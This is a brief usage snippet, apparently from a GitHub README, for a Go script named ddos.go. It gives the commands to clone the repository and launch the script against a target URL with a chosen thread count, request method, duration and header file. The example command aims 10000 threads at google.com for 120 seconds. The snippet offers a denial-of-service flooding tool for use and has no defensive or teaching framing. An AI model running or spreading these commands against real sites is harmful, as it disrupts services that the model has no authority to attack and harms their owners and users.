git clone https://github.com/duytuan207/ndt-go

cd ndt-go

go run ddos.go <url> <threads> <get/post> <seconds> <header.txt>

ví dụ: go run ddos.go https://www.google.com/ 10000 get 120 header.txt
